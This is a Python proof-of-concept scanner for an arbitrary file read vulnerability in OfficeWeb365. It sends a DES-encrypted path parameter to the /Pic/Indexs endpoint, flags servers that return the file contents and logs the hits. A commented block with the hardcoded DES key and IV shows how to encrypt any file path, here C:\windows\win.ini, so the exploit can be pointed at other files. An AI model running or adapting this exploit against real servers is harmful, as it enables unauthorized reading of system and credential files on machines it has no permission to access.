import requests
import time
import buter
import wirtefile

info = "OfficeWeb365-Indexs-任意文件读取"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09'
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "DNT":"1"
}


def office365Read(url):
    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=10)
        if reps.status_code == 200 and '[files]' in reps.text:
            print(buter.colors.GREEN+  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url + "\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)


'''
from Cryptodome.Cipher import DES
from Cryptodome.Util.Padding import pad, unpad
import base64

def encrypt_des(plaintext, key, iv):
    cipher = DES.new(key, DES.MODE_CBC, iv)
    padded_plaintext = pad(plaintext.encode('utf-8'), DES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    return base64.b64encode(ciphertext).decode('utf-8')

def decrypt_des(ciphertext, key, iv):
    cipher = DES.new(key, DES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext)
    decrypted = unpad(cipher.decrypt(ciphertext), DES.block_size).decode('utf-8')
    return decrypted

# 明文
plaintext = "C:\\windows\\win.ini"

# 密钥和初始向量
Keys = bytes([102, 16, 93, 156, 78, 4, 218, 32])
Iv = bytes([55, 103, 246, 79, 36, 99, 167, 3])

# 加密
ciphertext = encrypt_des(plaintext, Keys, Iv)
print("加密后的密文:", ciphertext)

# 解密
decrypted_text = decrypt_des(ciphertext, Keys, Iv)
print("解密后的明文:", decrypted_text)'''